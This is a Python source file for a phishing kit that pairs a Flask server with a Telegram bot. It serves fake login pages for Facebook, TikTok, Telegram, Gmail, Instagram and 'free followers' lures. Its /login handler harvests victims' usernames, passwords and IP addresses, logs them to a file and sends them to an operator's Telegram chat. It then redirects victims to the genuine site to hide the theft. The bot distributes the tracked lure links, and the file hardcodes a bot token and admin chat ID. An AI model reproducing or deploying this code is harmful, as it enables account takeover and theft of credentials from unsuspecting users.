import asyncio
import logging
import requests
import json
import os
import threading
import time
from flask import Flask, send_from_directory, request, redirect
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============= ফ্লাস্ক অ্যাপ =============
flask_app = Flask(__name__)

# টেমপ্লেট ফোল্ডার থেকে ফাইল সার্ভ করার জন্য
@flask_app.route('/')
def index():
    return "Bot is running!", 200

@flask_app.route('/health')
def health():
    return "OK", 200

@flask_app.route('/<path:filename>')
def serve_template(filename):
    if '?' in filename:
        filename = filename.split('?')[0]
    
    if not '.' in filename:
        filename = f"{filename}.html"
    
    try:
        return send_from_directory('templates', filename)
    except:
        return f"File {filename} not found", 404

# ============= লগইন হ্যান্ডলার (সব পেজের জন্য) =============
@flask_app.route('/login', methods=['POST'])
def handle_login():
    username = request.form.get('username') or request.form.get('email') or request.form.get('user') or request.form.get('facebookId') or 'N/A'
    password = request.form.get('password') or request.form.get('pass') or 'N/A'
    
    # URL থেকে page_type এবং user_id নিন
    page_type = request.args.get('page_type', 'unknown')
    user_id = request.args.get('user_id', ADMIN_CHAT_ID)
    
    # ফাইল নাম থেকে page_type বের করুন (যদি page_type না থাকে)
    referrer = request.referrer or ''
    if 'facebook' in referrer or 'facebook' in page_type:
        real_page_type = 'facebook'
        redirect_url = 'https://www.facebook.com/'
    elif 'tiktok' in referrer or 'tiktok' in page_type:
        real_page_type = 'tiktok'
        redirect_url = 'https://www.tiktok.com/'
    elif 'telegram' in referrer or 'telegram' in page_type:
        real_page_type = 'telegram'
        redirect_url = 'https://web.telegram.org/'
    elif 'gmail' in referrer or 'gmail' in page_type:
        real_page_type = 'gmail'
        redirect_url = 'https://mail.google.com/'
    elif 'instagram' in referrer or 'instagram' in page_type:
        real_page_type = 'instagram'
        redirect_url = 'https://www.instagram.com/'
    elif 'facebook_followers' in referrer or 'followers' in page_type:
        real_page_type = 'facebook_followers'
        redirect_url = 'https://www.facebook.com/'
    elif 'whatsapp' in referrer or 'whatsapp_groups' in page_type or 'groups' in page_type:
        real_page_type = 'whatsapp_groups'
        redirect_url = 'https://web.whatsapp.com/'
    elif 'tiktok_boost' in referrer or 'boost' in page_type:
        real_page_type = 'tiktok_boost'
        redirect_url = 'https://www.tiktok.com/'
    elif 'tiktok_followers' in referrer or 'followers' in page_type:
        real_page_type = 'tiktok_followers'
        redirect_url = 'https://www.tiktok.com/'
    else:
        real_page_type = page_type if page_type != 'unknown' else 'unknown'
        redirect_url = 'https://www.google.com/'
    
    # ডেটা সেভ
    data = {
        'username': username,
        'password': password,
        'ipAddress': request.remote_addr,
        'pageType': real_page_type,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # JSON ফাইলে সেভ
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    # টেলিগ্রামে পাঠান
    send_to_admin(data, user_id)
    
    # সঠিক প্ল্যাটফর্মে রিডাইরেক্ট
    return redirect(redirect_url)

def send_to_admin(data, user_id):
    """শুধু অ্যাডমিনকে লগইন তথ্য পাঠায়"""
    platform_names = {
        'facebook': '📘 Facebook',
        'tiktok': '🎵 TikTok',
        'telegram': '✈️ Telegram',
        'gmail': '📧 Gmail',
        'instagram': '📷 Instagram',
        'facebook_followers': '🎯 Facebook Followers',
        'whatsapp_groups': '🤤 WhatsApp Groups',
        'tiktok_boost': '🚀 TikTok Booster',
        'tiktok_followers': '💎 TikTok Followers'
    }
    
    platform_name = platform_names.get(data['pageType'], f"🌐 {data['pageType']}")
    
    message = f"""
🦅 New Login Received 🦅

{platform_name}
👤 Email/User: {data['username']}
🔑 Password: {data['password']}
🌐 IP: {data['ipAddress']}
⏰ Time: {data['timestamp']}
"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': ADMIN_CHAT_ID, 'text': message}, timeout=5)
        print(f"✅ Login info sent to admin from {data['pageType']}")
    except Exception as e:
        print(f"❌ Failed to send: {e}")

def broadcast_to_all(message_text):
    """সকল অ্যাক্টিভ ইউজারকে মেসেজ পাঠায়"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    success_count = 0
    for chat_id in active_users:
        try:
            requests.post(url, json={'chat_id': chat_id, 'text': message_text, 'parse_mode': 'Markdown'}, timeout=5)
            success_count += 1
        except:
            pass
    return success_count

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host='0.0.0.0', port=port)

# ============= টেলিগ্রাম বট =============
TELEGRAM_BOT_TOKEN = '7931517263:AAHTHHlaDNopwnvU1spYtlNahUH3FW2yO04'
ADMIN_CHAT_ID = 7843284032

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

RENDER_URL = "https://fc-bot-plv4.onrender.com"

active_users = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
        chat_id = query.message.chat.id
        message_id = query.message.message_id
        user_name = query.from_user.first_name
    else:
        chat_id = update.effective_chat.id
        message_id = None
        user_name = update.effective_user.first_name
    
    active_users.add(chat_id)
    try:
        requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All Mane page", callback_data="menu_main")],
        [InlineKeyboardButton("📢 Advance page", callback_data="menu_advance")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🥷 Community", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ])
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}😍🥰😘! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    if message_id:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(message, reply_markup=keyboard, parse_mode='Markdown')

async def menu_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📘 Facebook", callback_data="page_facebook")],
        [InlineKeyboardButton("🎵 TikTok", callback_data="page_tiktok")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="page_telegram")],
        [InlineKeyboardButton("📧 Gmail", callback_data="page_gmail")],
        [InlineKeyboardButton("📷 Instagram", callback_data="page_instagram")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text("😈 All Mane page Platforms\n\nSelect a platform:", reply_markup=keyboard)

async def menu_advance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Free Followers", callback_data="adv_followers")],
        [InlineKeyboardButton("🤤 Hot Groups", callback_data="adv_groups")],
        [InlineKeyboardButton("🚀 TikTok Booster", callback_data="adv_boost")],
        [InlineKeyboardButton("💎 TikTok Followers", callback_data="adv_tiktok")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text("📢 Advance page Menu\n\nSelect an option:", reply_markup=keyboard)

async def show_page(update: Update, context: ContextTypes.DEFAULT_TYPE, title: str, url_path: str, back_callback: str, page_type: str):
    query = update.callback_query
    await query.answer()
    
    user_id = query.message.chat.id
    # URL এ page_type প্যারামিটার যোগ করুন
    full_url = f"{RENDER_URL}/{url_path}?page_type={page_type}&user_id={user_id}"
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Open Page", url=full_url)],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data=back_callback)]
    ])
    
    await query.edit_message_text(f"{title}\n\n🔗 {full_url}", reply_markup=keyboard)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    message = f"""
📊 Bot Status

🦅 Status: 🟢 Active
🌐 URL: {RENDER_URL}
👥 Active Users: {len(active_users)}
✅ All systems operational
"""
    await query.edit_message_text(message, reply_markup=keyboard)

async def back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    print(f"🔘 Callback: {data}")
    
    if data == "menu_main":
        await menu_main(update, context)
    elif data == "menu_advance":
        await menu_advance(update, context)
    elif data == "status":
        await status(update, context)
    elif data == "back":
        await back(update, context)
    elif data == "page_facebook":
        await show_page(update, context, "📘 Facebook Page", "facebook", "menu_main", "facebook")
    elif data == "page_tiktok":
        await show_page(update, context, "🎵 TikTok Page", "tiktok", "menu_main", "tiktok")
    elif data == "page_telegram":
        await show_page(update, context, "✈️ Telegram Page", "telegram", "menu_main", "telegram")
    elif data == "page_gmail":
        await show_page(update, context, "📧 Gmail Page", "gmail", "menu_main", "gmail")
    elif data == "page_instagram":
        await show_page(update, context, "📷 Instagram Page", "instagram", "menu_main", "instagram")
    elif data == "adv_followers":
        await show_page(update, context, "🎯 Free Facebook Followers", "facebook_followers", "menu_advance", "facebook_followers")
    elif data == "adv_groups":
        await show_page(update, context, "🤤 Hot WhatsApp Groups", "Whatsapp_groups", "menu_advance", "whatsapp_groups")
    elif data == "adv_boost":
        await show_page(update, context, "🚀 TikTok Booster", "tiktok_boost", "menu_advance", "tiktok_boost")
    elif data == "adv_tiktok":
        await show_page(update, context, "💎 TikTok Followers", "tiktok_followers", "menu_advance", "tiktok_followers")
    else:
        await query.answer("Unknown button")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    chat_id = update.message.chat.id
    message_text = update.message.text
    
    active_users.add(chat_id)
    try:
        requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    # অ্যাডমিন ব্রডকাস্ট
    if chat_id == ADMIN_CHAT_ID:
        if message_text.startswith('/broadcast '):
            broadcast_msg = message_text.replace('/broadcast ', '')
            sent = broadcast_to_all(f"📢 {broadcast_msg}")
            await update.message.reply_text(f"✅ Broadcast পাঠানো হয়েছে {sent} জনের কাছে")
        elif message_text.startswith('/total'):
            await update.message.reply_text(f"👥 মোট ব্যবহারকারী: {len(active_users)} জন")
        elif message_text == '/start':
            await start(update, context)
        else:
            await update.message.reply_text(f'🙋 হ্যালো অ্যাডমিন {user_name}! সাধারণ ইউজারদের জন্য /start লিখুন।')
    
    elif message_text == '/start':
        await start(update, context)
    else:
        await update.message.reply_text(f'🙋 Hi {user_name}! Type /start to see the main menu.')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ Error: {context.error}")

def run_bot():
    print("🦅 Starting Telegram Bot...")
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("link", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    print("✅ Bot is polling for updates...")
    app.run_polling(allowed_updates=["message", "callback_query"])

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    run_bot()
